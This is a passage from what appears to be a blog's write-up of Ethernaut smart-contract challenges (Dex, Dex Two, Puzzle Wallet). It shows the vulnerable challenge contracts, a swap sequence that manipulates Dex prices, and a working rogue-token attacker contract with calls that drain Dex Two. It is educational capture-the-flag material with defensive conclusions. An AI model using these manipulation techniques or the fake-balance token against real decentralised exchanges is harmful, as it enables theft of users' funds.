+<span class="ln">34</span>  <span class="kd">function</span> <span class="nf">approve</span><span class="p">(</span><span class="kt">address</span> <span class="n">spender</span><span class="p">,</span> <span class="kt">uint</span> <span class="n">amount</span><span class="p">)</span> <span class="k">public</span> <span class="p">{</span>
+<span class="ln">35</span>    <span class="n">SwappableToken</span><span class="p">(</span><span class="n">token1</span><span class="p">).</span><span class="n">approve</span><span class="p">(</span><span class="n">spender</span><span class="p">,</span> <span class="n">amount</span><span class="p">);</span>
+<span class="ln">36</span>    <span class="n">SwappableToken</span><span class="p">(</span><span class="n">token2</span><span class="p">).</span><span class="n">approve</span><span class="p">(</span><span class="n">spender</span><span class="p">,</span> <span class="n">amount</span><span class="p">);</span>
+<span class="ln">37</span>  <span class="p">}</span>
+<span class="ln">38</span>
+<span class="ln">39</span>  <span class="kd">function</span> <span class="nf">balanceOf</span><span class="p">(</span><span class="kt">address</span> <span class="n">token</span><span class="p">,</span> <span class="kt">address</span> <span class="n">account</span><span class="p">)</span> <span class="k">public</span> <span class="k">view</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">uint</span><span class="p">){</span>
+<span class="ln">40</span>    <span class="k">return</span> <span class="n">IERC20</span><span class="p">(</span><span class="n">token</span><span class="p">).</span><span class="n">balanceOf</span><span class="p">(</span><span class="n">account</span><span class="p">);</span>
+<span class="ln">41</span>  <span class="p">}</span>
+<span class="ln">42</span><span class="p">}</span>
+<span class="ln">43</span>
+<span class="ln">44</span><span class="kd">contract</span> <span class="nc">SwappableToken</span> <span class="k">is</span> <span class="n">ERC20</span> <span class="p">{</span>
+<span class="ln">45</span>  <span class="kd">constructor</span><span class="p">(</span><span class="kt">string</span> <span class="k">memory</span> <span class="nb">name</span><span class="p">,</span> <span class="kt">string</span> <span class="k">memory</span> <span class="n">symbol</span><span class="p">,</span> <span class="kt">uint</span> <span class="n">initialSupply</span><span class="p">)</span> <span class="k">public</span> <span class="n">ERC20</span><span class="p">(</span><span class="nb">name</span><span class="p">,</span> <span class="n">symbol</span><span class="p">)</span> <span class="p">{</span>
+<span class="ln">46</span>        <span class="n">_mint</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">,</span> <span class="n">initialSupply</span><span class="p">);</span>
+<span class="ln">47</span>  <span class="p">}</span>
+<span class="ln">48</span><span class="p">}</span>
+</code></pre></div><h3 id="vulnerability--attack-vector-1">Vulnerability / Attack vector</h3>
+<p>The exchange rate is calculated from the reserves of each token in the Dex. An attacker can easily manipulate the balances by depositing tokens or by making swaps.</p>
+<h3 id="solution-1">Solution</h3>
+<p>The player can perform swaps with his tokens, to manipulate the reserves of the exchange.</p>
+<p>This challenge can be solved in two steps:</p>
+<ul>
+<li>Allow the exchange to spend the player's tokens, by calling <code>approve(&lt;DEX_INSTANCE_ADDRESS&gt;, 1000)</code> from the player's EOA.</li>
+<li>Swap back and forth between <code>token1</code> and <code>token2</code> until the dex reserves of one of the tokens is zero, by sucessively calling <code>swap(&lt;TOKENx_ADDRESS&gt;, &lt;TOKENy_ADDRESS&gt;, &lt;PLAYERS_BALANCE_OF_TOKENx&gt;)</code>, with <code>x</code> and <code>y</code> being <code>1</code> and <code>2</code> for every odd call, and viceversa for every even call.</li>
+</ul>
+<p>The progression of balances goes according to the following table, showing the balances after the <em>action</em> has been executed:</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">Action</th>
+<th style="text-align:center">Player's T1 balance</th>
+<th style="text-align:center">Player's T2 balance</th>
+<th style="text-align:center">Dex's T1 balance</th>
+<th style="text-align:center">Dex's T2 balance</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center"><code>approve(&lt;DEX_ADDRESS&gt;, 1000)</code></td>
+<td style="text-align:center">10</td>
+<td style="text-align:center">10</td>
+<td style="text-align:center">100</td>
+<td style="text-align:center">100</td>
+</tr>
+<tr>
+<td style="text-align:center"><code>swap(&lt;TOKEN1&gt;, &lt;TOKEN2&gt;, 10)</code></td>
+<td style="text-align:center">0</td>
+<td style="text-align:center">20</td>
+<td style="text-align:center">110</td>
+<td style="text-align:center">90</td>
+</tr>
+<tr>
+<td style="text-align:center"><code>swap(&lt;TOKEN2&gt;, &lt;TOKEN1&gt;, 20)</code></td>
+<td style="text-align:center">24</td>
+<td style="text-align:center">0</td>
+<td style="text-align:center">86</td>
+<td style="text-align:center">110</td>
+</tr>
+<tr>
+<td style="text-align:center"><code>swap(&lt;TOKEN1&gt;, &lt;TOKEN2&gt;, 24)</code></td>
+<td style="text-align:center">0</td>
+<td style="text-align:center">30</td>
+<td style="text-align:center">110</td>
+<td style="text-align:center">80</td>
+</tr>
+<tr>
+<td style="text-align:center"><code>swap(&lt;TOKEN2&gt;, &lt;TOKEN1&gt;, 30)</code></td>
+<td style="text-align:center">41</td>
+<td style="text-align:center">0</td>
+<td style="text-align:center">69</td>
+<td style="text-align:center">110</td>
+</tr>
+<tr>
+<td style="text-align:center"><code>swap(&lt;TOKEN1&gt;, &lt;TOKEN2&gt;, 41)</code></td>
+<td style="text-align:center">0</td>
+<td style="text-align:center">65</td>
+<td style="text-align:center">110</td>
+<td style="text-align:center">45</td>
+</tr>
+<tr>
+<td style="text-align:center"><code>swap(&lt;TOKEN2&gt;, &lt;TOKEN1&gt;, 45)</code></td>
+<td style="text-align:center">110</td>
+<td style="text-align:center">20</td>
+<td style="text-align:center">0</td>
+<td style="text-align:center">90</td>
+</tr>
+</tbody>
+</table>
+<p>The last call to <code>swap(address, address, uint)</code> wasn't for the full balance of the player's <code>token2</code>, simply because the Dex didn't have enough funds to pay for the swap.</p>
+<p>If the swap function was called for the full 65 tokens, the price according to <code>get_swap_price(&lt;TOKEN2&gt;, &lt;TOKEN1&gt;, 65)</code> should have been 158 (that is, $65 \times 110 / 45$ rounded down). The Dex only has 110 <code>token1</code>, so it can't transfer more than this amount. Calculating backwards from the price equation the amount of <code>token2</code> needed to get 110 <code>token1</code>, the result is 45.</p>
+<h3 id="conclusions-1">Conclusions</h3>
+<p>Price manipulation attacks are common in DeFi. There shouldn't be a single price feed, and certainly not if that feed comes from an exploitable source. As stated in the level solution page, the way to go is to use oracles that work as a reliable way of introducing decentralized price data to a transaction.</p>
+<hr>
+<h2 id="level-23-dex-two">Level 23: Dex Two</h2>
+<hr>
+<p>A variation on the previous level. The <code>swap()</code> function is different, and the goal is to drain both <code>token1</code> and <code>token2</code> reserves from the exchange.</p>
+<h3 id="contract-analysis-2">Contract analysis</h3>
+<p>Let's focus on the differences from the <code>Dex</code> contract of Level 22: now the exchange allows any token, not just <code>token1</code> and <code>token2</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="ln"> 1</span><span class="c1">// SPDX-License-Identifier: MIT
+</span><span class="ln"> 2</span><span class="c1"></span><span class="k">pragma solidity</span> <span class="o">^</span><span class="mi">0</span><span class="p">.</span><span class="mi">6</span><span class="p">.</span><span class="mi">0</span><span class="p">;</span>
+<span class="ln"> 3</span>
+<span class="ln"> 4</span><span class="kn">import</span> <span class="s">&#34;@openzeppelin/contracts/token/ERC20/IERC20.sol&#34;</span><span class="p">;</span>
+<span class="ln"> 5</span><span class="kn">import</span> <span class="s">&#34;@openzeppelin/contracts/token/ERC20/ERC20.sol&#34;</span><span class="p">;</span>
+<span class="ln"> 6</span><span class="kn">import</span> <span class="s">&#39;@openzeppelin/contracts/math/SafeMath.sol&#39;</span><span class="p">;</span>
+<span class="ln"> 7</span>
+<span class="ln"> 8</span><span class="kd">contract</span> <span class="nc">DexTwo</span>  <span class="p">{</span>
+<span class="ln"> 9</span>  <span class="kn">using</span> <span class="n">SafeMath</span> <span class="k">for</span> <span class="kt">uint</span><span class="p">;</span>
+<span class="ln">10</span>  <span class="kt">address</span> <span class="k">public</span> <span class="n">token1</span><span class="p">;</span>
+<span class="ln">11</span>  <span class="kt">address</span> <span class="k">public</span> <span class="n">token2</span><span class="p">;</span>
+<span class="ln">12</span>  <span class="kd">constructor</span><span class="p">(</span><span class="kt">address</span> <span class="n">_token1</span><span class="p">,</span> <span class="kt">address</span> <span class="n">_token2</span><span class="p">)</span> <span class="k">public</span> <span class="p">{</span>
+<span class="ln">13</span>    <span class="n">token1</span> <span class="o">=</span> <span class="n">_token1</span><span class="p">;</span>
+<span class="ln">14</span>    <span class="n">token2</span> <span class="o">=</span> <span class="n">_token2</span><span class="p">;</span>
+<span class="ln">15</span>  <span class="p">}</span>
+<span class="ln">16</span>
+<span class="ln">17</span>  <span class="kd">function</span> <span class="nf">swap</span><span class="p">(</span><span class="kt">address</span> <span class="k">from</span><span class="p">,</span> <span class="kt">address</span> <span class="n">to</span><span class="p">,</span> <span class="kt">uint</span> <span class="n">amount</span><span class="p">)</span> <span class="k">public</span> <span class="p">{</span>
+<span class="ln">18</span>    <span class="nb">require</span><span class="p">(</span><span class="n">IERC20</span><span class="p">(</span><span class="k">from</span><span class="p">).</span><span class="n">balanceOf</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">)</span> <span class="o">&gt;=</span> <span class="n">amount</span><span class="p">,</span> <span class="s">&#34;Not enough to swap&#34;</span><span class="p">);</span>
+<span class="ln">19</span>    <span class="kt">uint</span> <span class="n">swap_amount</span> <span class="o">=</span> <span class="n">get_swap_amount</span><span class="p">(</span><span class="k">from</span><span class="p">,</span> <span class="n">to</span><span class="p">,</span> <span class="n">amount</span><span class="p">);</span>
+<span class="ln">20</span>    <span class="n">IERC20</span><span class="p">(</span><span class="k">from</span><span class="p">).</span><span class="n">transferFrom</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">,</span> <span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">),</span> <span class="n">amount</span><span class="p">);</span>
+<span class="ln">21</span>    <span class="n">IERC20</span><span class="p">(</span><span class="n">to</span><span class="p">).</span><span class="n">approve</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">),</span> <span class="n">swap_amount</span><span class="p">);</span>
+<span class="ln">22</span>    <span class="n">IERC20</span><span class="p">(</span><span class="n">to</span><span class="p">).</span><span class="n">transferFrom</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">),</span> <span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">,</span> <span class="n">swap_amount</span><span class="p">);</span>
+<span class="ln">23</span>  <span class="p">}</span>
+<span class="ln">24</span>
+<span class="ln">25</span>  <span class="kd">function</span> <span class="nf">add_liquidity</span><span class="p">(</span><span class="kt">address</span> <span class="n">token_address</span><span class="p">,</span> <span class="kt">uint</span> <span class="n">amount</span><span class="p">)</span> <span class="k">public</span><span class="p">{</span>
+<span class="ln">26</span>    <span class="n">IERC20</span><span class="p">(</span><span class="n">token_address</span><span class="p">).</span><span class="n">transferFrom</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">,</span> <span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">),</span> <span class="n">amount</span><span class="p">);</span>
+<span class="ln">27</span>  <span class="p">}</span>
+<span class="ln">28</span>
+<span class="ln">29</span>  <span class="kd">function</span> <span class="nf">get_swap_amount</span><span class="p">(</span><span class="kt">address</span> <span class="k">from</span><span class="p">,</span> <span class="kt">address</span> <span class="n">to</span><span class="p">,</span> <span class="kt">uint</span> <span class="n">amount</span><span class="p">)</span> <span class="k">public</span> <span class="k">view</span> <span class="k">returns</span><span class="p">(</span><span class="kt">uint</span><span class="p">){</span>
+<span class="ln">30</span>    <span class="k">return</span><span class="p">((</span><span class="n">amount</span> <span class="o">*</span> <span class="n">IERC20</span><span class="p">(</span><span class="n">to</span><span class="p">).</span><span class="n">balanceOf</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">)))</span><span class="o">/</span><span class="n">IERC20</span><span class="p">(</span><span class="k">from</span><span class="p">).</span><span class="n">balanceOf</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">)));</span>
+<span class="ln">31</span>  <span class="p">}</span>
+<span class="ln">32</span>
+<span class="ln">33</span>  <span class="kd">function</span> <span class="nf">approve</span><span class="p">(</span><span class="kt">address</span> <span class="n">spender</span><span class="p">,</span> <span class="kt">uint</span> <span class="n">amount</span><span class="p">)</span> <span class="k">public</span> <span class="p">{</span>
+<span class="ln">34</span>    <span class="n">SwappableTokenTwo</span><span class="p">(</span><span class="n">token1</span><span class="p">).</span><span class="n">approve</span><span class="p">(</span><span class="n">spender</span><span class="p">,</span> <span class="n">amount</span><span class="p">);</span>
+<span class="ln">35</span>    <span class="n">SwappableTokenTwo</span><span class="p">(</span><span class="n">token2</span><span class="p">).</span><span class="n">approve</span><span class="p">(</span><span class="n">spender</span><span class="p">,</span> <span class="n">amount</span><span class="p">);</span>
+<span class="ln">36</span>  <span class="p">}</span>
+<span class="ln">37</span>
+<span class="ln">38</span>  <span class="kd">function</span> <span class="nf">balanceOf</span><span class="p">(</span><span class="kt">address</span> <span class="n">token</span><span class="p">,</span> <span class="kt">address</span> <span class="n">account</span><span class="p">)</span> <span class="k">public</span> <span class="k">view</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">uint</span><span class="p">){</span>
+<span class="ln">39</span>    <span class="k">return</span> <span class="n">IERC20</span><span class="p">(</span><span class="n">token</span><span class="p">).</span><span class="n">balanceOf</span><span class="p">(</span><span class="n">account</span><span class="p">);</span>
+<span class="ln">40</span>  <span class="p">}</span>
+<span class="ln">41</span><span class="p">}</span>
+<span class="ln">42</span>
+<span class="ln">43</span><span class="kd">contract</span> <span class="nc">SwappableTokenTwo</span> <span class="k">is</span> <span class="n">ERC20</span> <span class="p">{</span>
+<span class="ln">44</span>  <span class="kd">constructor</span><span class="p">(</span><span class="kt">string</span> <span class="k">memory</span> <span class="nb">name</span><span class="p">,</span> <span class="kt">string</span> <span class="k">memory</span> <span class="n">symbol</span><span class="p">,</span> <span class="kt">uint</span> <span class="n">initialSupply</span><span class="p">)</span> <span class="k">public</span> <span class="n">ERC20</span><span class="p">(</span><span class="nb">name</span><span class="p">,</span> <span class="n">symbol</span><span class="p">)</span> <span class="p">{</span>
+<span class="ln">45</span>        <span class="n">_mint</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">,</span> <span class="n">initialSupply</span><span class="p">);</span>
+<span class="ln">46</span>  <span class="p">}</span>
+<span class="ln">47</span><span class="p">}</span>
+</code></pre></div><h3 id="vulnerability--attack-vector-2">Vulnerability / Attack vector</h3>
+<p>The attacker can swap a malicious token that returns any value when the <code>balanceOf()</code> method is called, thus manipulating the price of any pair that involves this rogue token.</p>
+<h3 id="solution-2">Solution</h3>
+<p>The attack consists in swapping from <code>rogueToken</code> to <code>token1</code> and <code>token2</code> to empty the exchange's reserve.</p>
+<p>This <code>rogueToken</code> should return a high enough balance for the attacker, and a crafted balance for the exchange. The exact value will come from the equation implemented in <code>get_swap_amount()</code>:</p>
+<p>\[ out = \frac{amount \times balance_{to}}{balance_{from}} \]</p>
+<p>Where $balance_{to}$ and $balance_{from}$ are the exchange's balance of tokens <code>to</code> and <code>from</code>.</p>
+<p>To empty the balance of the valid tokens, we have to swap from the rogue token to the valid token. Also, as we have <em>infinity</em> rogue tokens, we need to set the exchange's balance to a set amount, so that the return from <code>get_swap_amount()</code> is exactly 100.</p>
+<p>Let's craft the attack: <em>Swap 1 <code>rogueTokens</code> for 100 <code>token1</code></em>, that is, call <code>swap(&lt;rogueToken&gt;, &lt;token1&gt;, 1)</code>. To be able to get 100 <code>token1</code> from the swap, the exchange's balance of <code>rogueToken</code> should be:</p>
+<p>\[ balance_{from} = \frac{amount \times balance_{to}}{expectedOut} = \frac{1 \times 100}{100} = 1 \]</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="ln"> 1</span><span class="kd">contract</span> <span class="nc">DexTwoAttack</span> <span class="k">is</span> <span class="n">IERC20</span> <span class="p">{</span>
+<span class="ln"> 2</span>
+<span class="ln"> 3</span>    <span class="kt">uint256</span> <span class="k">public</span> <span class="n">fakeBalance</span><span class="p">;</span>
+<span class="ln"> 4</span>    <span class="kt">address</span> <span class="k">public</span> <span class="n">exchange</span><span class="p">;</span>
+<span class="ln"> 5</span>
+<span class="ln"> 6</span>    <span class="kd">function</span> <span class="nf">setExchange</span><span class="p">(</span><span class="kt">address</span> <span class="n">to</span><span class="p">)</span> <span class="k">public</span> <span class="p">{</span>
+<span class="ln"> 7</span>        <span class="n">exchange</span> <span class="o">=</span> <span class="n">to</span><span class="p">;</span>
+<span class="ln"> 8</span>    <span class="p">}</span>
+<span class="ln"> 9</span>
+<span class="ln">10</span>    <span class="kd">function</span> <span class="nf">setFakeBalance</span><span class="p">(</span><span class="kt">uint256</span> <span class="n">amount</span><span class="p">)</span> <span class="k">public</span> <span class="p">{</span>
+<span class="ln">11</span>        <span class="n">fakeBalance</span> <span class="o">=</span> <span class="n">amount</span><span class="p">;</span>
+<span class="ln">12</span>    <span class="p">}</span>
+<span class="ln">13</span>
+<span class="ln">14</span>    <span class="kd">function</span> <span class="nf">transferFrom</span><span class="p">(</span><span class="kt">address</span><span class="p">,</span> <span class="kt">address</span><span class="p">,</span> <span class="kt">uint256</span><span class="p">)</span> <span class="k">public</span> <span class="k">override</span> <span class="k">returns</span><span class="p">(</span><span class="kt">bool</span><span class="p">){</span>
+<span class="ln">15</span>        <span class="k">return</span> <span class="kc">true</span><span class="p">;</span>
+<span class="ln">16</span>    <span class="p">}</span>
+<span class="ln">17</span>
+<span class="ln">18</span>    <span class="kd">function</span> <span class="nf">balanceOf</span><span class="p">(</span><span class="kt">address</span> <span class="n">account</span><span class="p">)</span> <span class="k">public</span> <span class="k">view</span> <span class="k">override</span> <span class="k">returns</span><span class="p">(</span><span class="kt">uint256</span><span class="p">)</span> <span class="p">{</span>
+<span class="ln">19</span>        <span class="k">if</span> <span class="p">(</span><span class="n">account</span> <span class="o">==</span> <span class="n">exchange</span><span class="p">)</span> <span class="p">{</span>
+<span class="ln">20</span>            <span class="k">return</span> <span class="n">fakeBalance</span><span class="p">;</span>
+<span class="ln">21</span>        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+<span class="ln">22</span>            <span class="k">return</span> <span class="kt">uint256</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
+<span class="ln">23</span>        <span class="p">}</span>
+<span class="ln">24</span>    <span class="p">}</span>
+<span class="ln">25</span>
+<span class="ln">26</span>    <span class="kd">function</span> <span class="nf">allowance</span><span class="p">(</span><span class="kt">address</span> <span class="n">owner</span><span class="p">,</span> <span class="kt">address</span> <span class="n">spender</span><span class="p">)</span> <span class="k">external</span> <span class="k">view</span> <span class="k">override</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">uint256</span><span class="p">)</span> <span class="p">{}</span>
+<span class="ln">27</span>    <span class="kd">function</span> <span class="nf">approve</span><span class="p">(</span><span class="kt">address</span> <span class="n">spender</span><span class="p">,</span> <span class="kt">uint256</span> <span class="n">amount</span><span class="p">)</span> <span class="k">external</span> <span class="k">override</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">bool</span><span class="p">)</span> <span class="p">{}</span>
+<span class="ln">28</span>    <span class="kd">function</span> <span class="nf">transfer</span><span class="p">(</span><span class="kt">address</span> <span class="n">recipient</span><span class="p">,</span> <span class="kt">uint256</span> <span class="n">amount</span><span class="p">)</span> <span class="k">external</span> <span class="k">override</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">bool</span><span class="p">)</span> <span class="p">{}</span>
+<span class="ln">29</span>    <span class="kd">function</span> <span class="nf">totalSupply</span><span class="p">()</span> <span class="k">external</span> <span class="k">view</span> <span class="k">override</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">uint256</span><span class="p">)</span> <span class="p">{}</span>
+<span class="ln">30</span><span class="p">}</span>
+</code></pre></div><p>The attacker contract is an ERC20 token that implements only the needed functions. If the <code>balanceOf(address)</code> function is called from the exchange, it will return <code>fakeBalance</code>, a value that can be set by the attacker. For any other caller, the function returns the maximum value for the <code>uint256</code> type.</p>
+<p>So, to drain the exchange, two calls are to be made to the attacker instance:</p>
+<ul>
+<li><code>setFakeBalance(1)</code></li>
+<li><code>setExchange(&lt;dex&gt;)</code></li>
+</ul>
+<p>And three calls to the exchange instance:</p>
+<ul>
+<li><code>approve(&lt;dex&gt;, 1000)</code></li>
+<li><code>swap(&lt;rogueToken&gt;, &lt;token1&gt;, 1)</code></li>
+<li><code>swap(&lt;rogueToken&gt;, &lt;token2&gt;, 1)</code></li>
+</ul>
+<h3 id="conclusions-2">Conclusions</h3>
+<p>It is a big security risk to trust external contracts. Even if they implement ERC20 interface correctly, they still can have a totally different behaviour.</p>
+<hr>
+<h2 id="level-24-puzzle-wallet">Level 24: Puzzle wallet</h2>
+<hr>
+<p>Some friends created an upgradable and collaborative wallet to batch payments on a single transaction. The implementation is insecure, so let's find the bug. The goal is to become the administrator of the proxy.</p>
+<h3 id="contract-analysis-3">Contract analysis</h3>
+<p>There are two contracts in this challenge. The first one implements an <a href="https://docs.openzeppelin.com/upgrades-plugins/1.x/proxies">upgradeable proxy</a>, and the second one is the Puzzle Wallet created by the group of friends.</p>
+<p>Using an upgradeable proxy is a way to correct bugs on already deployed contracts. The <code>PuzzleProxy</code> inherits from OpenZeppelin's <code>UpgradeableProxy</code> and implements an access control where the administrator can upgrade the implementation via <code>upgradeTo(address)</code>, and replace himself as an administrator via <code>approveNewAdmin(address)</code>. Anyone can propose a new administrator address calling <code>proposeNewAdmin(address)</code>, but the change is not effective until the current administrator approves the change.</p>
+<p>The <code>PuzzleWallet</code> also has an access control mechanism, where the owner can whiltelist new addresses to interact with the contract. The whitelist-only functions are:</p>
+<ul>
+<li><code>setMaxBalance(uint256)</code>, sets the maximum balance allowed in the contract.</li>
+<li><code>deposit()</code>, increases the caller's balance by the <code>msg.value</code> sent.</li>
+<li><code>execute(address, uint256, bytes)</code>, allows to call an external address transferring value, given that the caller has enough balance.</li>
+<li><code>multicall(bytes[])</code>, allows to perform multiple transactions in a single call.</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="ln"> 1</span><span class="c1">// SPDX-License-Identifier: MIT
+</span><span class="ln"> 2</span><span class="c1"></span><span class="k">pragma solidity</span> <span class="o">^</span><span class="mi">0</span><span class="p">.</span><span class="mi">6</span><span class="p">.</span><span class="mi">0</span><span class="p">;</span>
+<span class="ln"> 3</span><span class="k">pragma experimental</span> <span class="n">ABIEncoderV2</span><span class="p">;</span>
+<span class="ln"> 4</span>
+<span class="ln"> 5</span><span class="kn">import</span> <span class="s">&#34;@openzeppelin/contracts/math/SafeMath.sol&#34;</span><span class="p">;</span>
+<span class="ln"> 6</span><span class="kn">import</span> <span class="s">&#34;@openzeppelin/contracts/proxy/UpgradeableProxy.sol&#34;</span><span class="p">;</span>
+<span class="ln"> 7</span>
+<span class="ln"> 8</span><span class="kd">contract</span> <span class="nc">PuzzleProxy</span> <span class="k">is</span> <span class="n">UpgradeableProxy</span> <span class="p">{</span>
+<span class="ln"> 9</span>    <span class="kt">address</span> <span class="k">public</span> <span class="n">pendingAdmin</span><span class="p">;</span>
+<span class="ln">10</span>    <span class="kt">address</span> <span class="k">public</span> <span class="n">admin</span><span class="p">;</span>
+<span class="ln">11</span>
+<span class="ln">12</span>    <span class="kd">constructor</span><span class="p">(</span><span class="kt">address</span> <span class="n">_admin</span><span class="p">,</span> <span class="kt">address</span> <span class="n">_implementation</span><span class="p">,</span> <span class="kt">bytes</span> <span class="k">memory</span> <span class="n">_initData</span><span class="p">)</span> <span class="n">UpgradeableProxy</span><span class="p">(</span><span class="n">_implementation</span><span class="p">,</span> <span class="n">_initData</span><span class="p">)</span> <span class="k">public</span> <span class="p">{</span>
+<span class="ln">13</span>        <span class="n">admin</span> <span class="o">=</span> <span class="n">_admin</span><span class="p">;</span>
+<span class="ln">14</span>    <span class="p">}</span>
+<span class="ln">15</span>
+<span class="ln">16</span>    <span class="kd">modifier</span> <span class="nf">onlyAdmin</span> <span class="p">{</span>
+<span class="ln">17</span>      <span class="nb">require</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span> <span class="o">==</span> <span class="n">admin</span><span class="p">,</span> <span class="s">&#34;Caller is not the admin&#34;</span><span class="p">);</span>
+<span class="ln">18</span>      <span class="k">_</span><span class="p">;</span>
+<span class="ln">19</span>    <span class="p">}</span>
+<span class="ln">20</span>
+<span class="ln">21</span>    <span class="kd">function</span> <span class="nf">proposeNewAdmin</span><span class="p">(</span><span class="kt">address</span> <span class="n">_newAdmin</span><span class="p">)</span> <span class="k">external</span> <span class="p">{</span>
+<span class="ln">22</span>        <span class="n">pendingAdmin</span> <span class="o">=</span> <span class="n">_newAdmin</span><span class="p">;</span>
+<span class="ln">23</span>    <span class="p">}</span>
+<span class="ln">24</span>
+<span class="ln">25</span>    <span class="kd">function</span> <span class="nf">approveNewAdmin</span><span class="p">(</span><span class="kt">address</span> <span class="n">_expectedAdmin</span><span class="p">)</span> <span class="k">external</span> <span class="n">onlyAdmin</span> <span class="p">{</span>
+<span class="ln">26</span>        <span class="nb">require</span><span class="p">(</span><span class="n">pendingAdmin</span> <span class="o">==</span> <span class="n">_expectedAdmin</span><span class="p">,</span> <span class="s">&#34;Expected new admin by the current admin is not the pending admin&#34;</span><span class="p">);</span>
+<span class="ln">27</span>        <span class="n">admin</span> <span class="o">=</span> <span class="n">pendingAdmin</span><span class="p">;</span>
+<span class="ln">28</span>    <span class="p">}</span>
+<span class="ln">29</span>
+<span class="ln">30</span>    <span class="kd">function</span> <span class="nf">upgradeTo</span><span class="p">(</span><span class="kt">address</span> <span class="n">_newImplementation</span><span class="p">)</span> <span class="k">external</span> <span class="n">onlyAdmin</span> <span class="p">{</span>
+<span class="ln">31</span>        <span class="n">_upgradeTo</span><span class="p">(</span><span class="n">_newImplementation</span><span class="p">);</span>
+<span class="ln">32</span>    <span class="p">}</span>
+<span class="ln">33</span><span class="p">}</span>
+<span class="ln">34</span>
+<span class="ln">35</span><span class="kd">contract</span> <span class="nc">PuzzleWallet</span> <span class="p">{</span>
+<span class="ln">36</span>    <span class="kn">using</span> <span class="n">SafeMath</span> <span class="k">for</span> <span class="kt">uint256</span><span class="p">;</span>
+<span class="ln">37</span>    <span class="kt">address</span> <span class="k">public</span> <span class="n">owner</span><span class="p">;</span>
+<span class="ln">38</span>    <span class="kt">uint256</span> <span class="k">public</span> <span class="n">maxBalance</span><span class="p">;</span>
+<span class="ln">39</span>    <span class="kd">mapping</span><span class="p">(</span><span class="kt">address</span> <span class="o">=&gt;</span> <span class="kt">bool</span><span class="p">)</span> <span class="k">public</span> <span class="n">whitelisted</span><span class="p">;</span>
+<span class="ln">40</span>    <span class="kd">mapping</span><span class="p">(</span><span class="kt">address</span> <span class="o">=&gt;</span> <span class="kt">uint256</span><span class="p">)</span> <span class="k">public</span> <span class="n">balances</span><span class="p">;</span>
+<span class="ln">41</span>
+<span class="ln">42</span>    <span class="kd">function</span> <span class="nf">init</span><span class="p">(</span><span class="kt">uint256</span> <span class="n">_maxBalance</span><span class="p">)</span> <span class="k">public</span> <span class="p">{</span>
+<span class="ln">43</span>        <span class="nb">require</span><span class="p">(</span><span class="n">maxBalance</span> <span class="o">==</span> <span class="mi">0</span><span class="p">,</span> <span class="s">&#34;Already initialized&#34;</span><span class="p">);</span>
+<span class="ln">44</span>        <span class="n">maxBalance</span> <span class="o">=</span> <span class="n">_maxBalance</span><span class="p">;</span>
+<span class="ln">45</span>        <span class="n">owner</span> <span class="o">=</span> <span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">;</span>
+<span class="ln">46</span>    <span class="p">}</span>
+<span class="ln">47</span>
+<span class="ln">48</span>    <span class="kd">modifier</span> <span class="nf">onlyWhitelisted</span> <span class="p">{</span>
+<span class="ln">49</span>        <span class="nb">require</span><span class="p">(</span><span class="n">whitelisted</span><span class="p">[</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">],</span> <span class="s">&#34;Not whitelisted&#34;</span><span class="p">);</span>
+<span class="ln">50</span>        <span class="k">_</span><span class="p">;</span>
+<span class="ln">51</span>    <span class="p">}</span>
+<span class="ln">52</span>
+<span class="ln">53</span>    <span class="kd">function</span> <span class="nf">setMaxBalance</span><span class="p">(</span><span class="kt">uint256</span> <span class="n">_maxBalance</span><span class="p">)</span> <span class="k">external</span> <span class="n">onlyWhitelisted</span> <span class="p">{</span>
+<span class="ln">54</span>      <span class="nb">require</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">).</span><span class="nb">balance</span> <span class="o">==</span> <span class="mi">0</span><span class="p">,</span> <span class="s">&#34;Contract balance is not 0&#34;</span><span class="p">);</span>
+<span class="ln">55</span>      <span class="n">maxBalance</span> <span class="o">=</span> <span class="n">_maxBalance</span><span class="p">;</span>
+<span class="ln">56</span>    <span class="p">}</span>
+<span class="ln">57</span>
+<span class="ln">58</span>    <span class="kd">function</span> <span class="nf">addToWhitelist</span><span class="p">(</span><span class="kt">address</span> <span class="n">addr</span><span class="p">)</span> <span class="k">external</span> <span class="p">{</span>
+<span class="ln">59</span>        <span class="nb">require</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span> <span class="o">==</span> <span class="n">owner</span><span class="p">,</span> <span class="s">&#34;Not the owner&#34;</span><span class="p">);</span>
